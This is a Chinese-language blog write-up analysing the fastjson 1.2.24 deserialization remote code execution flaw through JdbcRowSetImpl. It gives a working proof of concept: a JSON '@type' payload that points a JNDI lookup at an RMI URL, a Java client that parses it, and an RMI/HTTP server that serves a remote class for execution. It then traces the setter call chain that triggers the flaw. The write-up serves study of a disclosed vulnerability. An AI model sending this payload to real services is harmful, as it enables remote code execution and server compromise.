# fastjson 反序列化漏洞详解（JdbcRowSetImpl）

> `apache common collections`以及Spring RCE都是利用了`readObject`方法进行利用链触发的。`fastjson`的反序列化则是利用了目标类的`set`方法与`get`方法，因为这两个方法是`fastjson`在进行反序列化时需要调用的方法。
>
> `fastjson`是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过1w8，在2017年3月15日，`fastjson`官方主动爆出`fastjson`在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://github.com/alibaba/fastjson/wiki/security_update_20170315

## POC

主要的`payload`如下，很简单就是利用了Spring JNDI的漏洞，在进行`lookup()`方法时出现的漏洞。

```
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://127.0.0.1:1099/object",
    "autoCommit":true
}
```

整体的利用代码也很简单，就是将payload进行反序列化就可以。

### Client端

```
package JavaUnser;

import com.alibaba.fastjson.JSON;

public class fastjsonPoc {

    public static void JdbcRowSetImplTrriger(){
        //jdk8以下版本
        String payload="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/object\"," +
                "\"autoCommit\":true}";
        JSON.parseObject(payload);
    }
    public static void main(String args[]){
        try {
            JdbcRowSetImplTrriger();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Server端

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpServer;

import javax.naming.Reference;
import java.net.InetSocketAddress;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {

    public static void main(String[] args) throws Exception {
        System.out.println("Starting HTTP server");
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
        httpServer.createContext("/",new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();

        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("ExportObject",
                "ExportObject","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("object",referenceWrapper);
    }
}
```

`server`端还有两个文件一个是`ExportObject.java`、还有一个`HttpFileHandler.java`，项目文件中都有就不贴上来了。首先要保证`target`文件下存在`ExportObject.class`，然后先开启`server`端，在开启`client`端就可以执行。

## 触发链

首先会执行`JdbcRowSetImpl`类下边的`autoCommit`属性，然后由于使用的是`parseObject`方法，会先触发所有的`set`操作，因此会触发`setAutoCommit`。

![1558168186744](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1558168186744.png)

进一步跟进到`connect`函数中，会看到有`lookup`方法，根据之前对于Spring RCE反序列化的分析，可以直接触发恶意类的反序列化以及恶意代码。

![1558168499092](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1558168499092.png)

![1558169486135](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1558169486135.png)

对应的调用链，有兴趣的可以自己跟进去一点点看。关键的部分就是上边的几个函数调用。

![1558169650224](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1558169650224.png)

然后就会进行反序列化的触发啦，这里要确认开启两个一个是Server端一个是Clinet端才能成功，然后设计一下线程`sleep`，不然会一直弹计算器弹崩掉。

![1558169741534](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1558169741534.png)





## 参考链接

[Java反序列化漏洞的一些利用链分析](https://www.anquanke.com/post/id/173459#h2-9)

[基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析](http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/)